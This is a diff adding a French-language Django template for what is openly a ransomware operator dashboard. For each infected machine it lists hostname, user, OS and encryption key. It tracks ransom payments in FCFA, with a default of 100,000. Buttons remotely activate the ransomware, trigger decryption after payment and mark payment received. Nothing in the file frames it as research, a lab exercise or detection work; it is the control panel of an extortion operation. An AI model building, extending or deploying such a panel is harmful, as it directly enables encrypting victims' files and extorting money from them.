@@ -1,0 +1,210 @@
+{% extends 'dashboard/base.html' %}
+
+{% block title %}Détails - {{ machine.hostname }}{% endblock %}
+
+{% block content %}
+<div style="margin-bottom: 1rem;">
+    <a href="{% url 'dashboard_home' %}" class="btn btn-primary">← Retour au Dashboard</a>
+</div>
+
+<h2 style="margin-bottom: 1.5rem; color: #ff0000;">💻 {{ machine.hostname }}</h2>
+
+<div class="detail-card">
+    <h3 style="color: #ff0000; margin-bottom: 1rem;">Informations de la Machine</h3>
+    
+    <div class="detail-row">
+        <div class="detail-label">ID Machine:</div>
+        <div class="detail-value"><code>{{ machine.machine_id }}</code></div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Hostname:</div>
+        <div class="detail-value">{{ machine.hostname }}</div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Utilisateur:</div>
+        <div class="detail-value">{{ machine.username }}</div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Système d'exploitation:</div>
+        <div class="detail-value">{{ machine.os_info }}</div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Date d'enregistrement:</div>
+        <div class="detail-value">{{ machine.registered_at|date:"d/m/Y à H:i:s" }}</div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Dernière activité:</div>
+        <div class="detail-value">{{ machine.last_seen|date:"d/m/Y à H:i:s" }}</div>
+    </div>
+</div>
+
+<div class="detail-card">
+    <h3 style="color: #ff0000; margin-bottom: 1rem;">Statut du Ransomware</h3>
+    
+    <div class="detail-row">
+        <div class="detail-label">Activé:</div>
+        <div class="detail-value">
+            {% if machine.is_activated %}
+                <span class="badge success">✓ OUI</span>
+                {% if machine.activated_at %}
+                    <span style="color: #888; margin-left: 1rem;">{{ machine.activated_at|date:"d/m/Y à H:i" }}</span>
+                {% endif %}
+            {% else %}
+                <span class="badge danger">✗ NON</span>
+            {% endif %}
+        </div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Fichiers chiffrés:</div>
+        <div class="detail-value">
+            {% if machine.is_encrypted %}
+                <span class="badge danger">✓ OUI ({{ machine.files_encrypted }} fichiers)</span>
+                {% if machine.encrypted_at %}
+                    <span style="color: #888; margin-left: 1rem;">{{ machine.encrypted_at|date:"d/m/Y à H:i" }}</span>
+                {% endif %}
+            {% else %}
+                <span class="badge info">✗ NON</span>
+            {% endif %}
+        </div>
+    </div>
+    
+    <div class="detail-row">
+        <div class="detail-label">Fichiers déchiffrés:</div>
+        <div class="detail-value">
+            {% if machine.is_decrypted %}
+                <span class="badge success">✓ OUI</span>
+                {% if machine.decrypted_at %}
+                    <span style="color: #888; margin-left: 1rem;">{{ machine.decrypted_at|date:"d/m/Y à H:i" }}</span>
+                {% endif %}
+            {% else %}
+                <span class="badge danger">✗ NON</span>
+            {% endif %}
+        </div>
+    </div>
+    
+    {% if machine.encryption_key %}
+    <div class="detail-row">
+        <div class="detail-label">Clé de chiffrement:</div>
+        <div class="detail-value">
+            <code style="background: rgba(0,0,0,0.3); padding: 0.5rem; border-radius: 3px; display: inline-block; word-break: break-all;">
+                {{ machine.encryption_key|truncatechars:60 }}
+            </code>
+        </div>
+    </div>
+    {% endif %}
+</div>
+
+<div class="detail-card">
+    <h3 style="color: #ff0000; margin-bottom: 1rem;">💰 Paiement</h3>
+    
+    <div class="detail-row">
+        <div class="detail-label">Statut du paiement:</div>
+        <div class="detail-value">
+            {% if machine.payment_received %}
+                <span class="badge success">✓ REÇU</span>
+            {% else %}
+                <span class="badge danger">✗ EN ATTENTE</span>
+            {% endif %}
+        </div>
+    </div>
+    
+    {% if machine.payment_received %}
+    <div class="detail-row">
+        <div class="detail-label">Montant:</div>
+        <div class="detail-value"><strong>{{ machine.payment_amount }} FCFA</strong></div>
+    </div>
+    
+    {% if machine.payment_proof %}
+    <div class="detail-row">
+        <div class="detail-label">Preuve:</div>
+        <div class="detail-value">{{ machine.payment_proof }}</div>
+    </div>
+    {% endif %}
+    {% endif %}
+</div>
+
+<div class="detail-card">
+    <h3 style="color: #ff0000; margin-bottom: 1rem;">⚡ Actions</h3>
+    
+    <div class="action-buttons" style="margin-top: 1rem;">
+        {% if not machine.is_activated %}
+            <a href="{% url 'activate_machine' machine.machine_id %}" 
+               class="btn btn-danger"
+               onclick="return confirm('Êtes-vous sûr de vouloir activer le ransomware sur cette machine ?')">
+                🚀 Activer le Ransomware
+            </a>
+        {% endif %}
+        
+        {% if machine.is_encrypted and not machine.is_decrypted %}
+            <a href="{% url 'decrypt_machine' machine.machine_id %}" 
+               class="btn btn-success"
+               onclick="return confirm('Êtes-vous sûr de vouloir déclencher le déchiffrement ?')">
+                🔓 Déchiffrer les Fichiers
+            </a>
+        {% endif %}
+        
+        {% if not machine.payment_received %}
+        <button class="btn btn-primary" onclick="document.getElementById('payment-form').style.display='block'">
+            💳 Marquer Paiement Reçu
+        </button>
+        {% endif %}
+        
+        <a href="{% url 'delete_machine' machine.machine_id %}" 
+           class="btn btn-danger"
+           onclick="return confirm('Êtes-vous sûr de vouloir supprimer cette machine ?')">
+            🗑️ Supprimer
+        </a>
+    </div>
+    
+    {% if not machine.payment_received %}
+    <div id="payment-form" style="display: none; margin-top: 1.5rem; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 5px;">
+        <h4 style="color: #ff0000; margin-bottom: 1rem;">Enregistrer un paiement</h4>
+        <form method="POST" action="{% url 'mark_payment' machine.machine_id %}">
+            {% csrf_token %}
+            <div style="margin-bottom: 1rem;">
+                <label style="display: block; margin-bottom: 0.5rem;">Montant (FCFA):</label>
+                <input type="number" name="amount" value="100000" required
+                       style="padding: 0.5rem; border-radius: 3px; border: 1px solid #555; background: #222; color: #fff; width: 300px;">
+            </div>
+            <div style="margin-bottom: 1rem;">
+                <label style="display: block; margin-bottom: 0.5rem;">Preuve de paiement (optionnel):</label>
+                <textarea name="proof" rows="3"
+                          style="padding: 0.5rem; border-radius: 3px; border: 1px solid #555; background: #222; color: #fff; width: 100%; max-width: 500px;"
+                          placeholder="ID de transaction, numéro de téléphone, etc."></textarea>
+            </div>
+            <button type="submit" class="btn btn-success">💾 Enregistrer</button>
+            <button type="button" class="btn btn-danger" onclick="document.getElementById('payment-form').style.display='none'">
+                ✖ Annuler
+            </button>
+        </form>
+    </div>
+    {% endif %}
+</div>
+
+<div class="logs-section">
+    <h3 style="color: #ff0000; margin-bottom: 1rem;">📜 Historique des Activités</h3>
+    
+    {% if logs %}
+        {% for log in logs %}
+        <div class="log-entry">
+            <div class="log-time">{{ log.timestamp|date:"d/m/Y à H:i:s" }}</div>
+            <div class="log-status">{{ log.status }}</div>
+            {% if log.details %}
+            <div class="log-details">{{ log.details }}</div>
+            {% endif %}
+        </div>
+        {% endfor %}
+    {% else %}
+        <p style="color: #888; padding: 1rem; background: rgba(0,0,0,0.3); border-radius: 5px;">
+            Aucune activité enregistrée.
+        </p>
+    {% endif %}
+</div>
+
+{% endblock %}
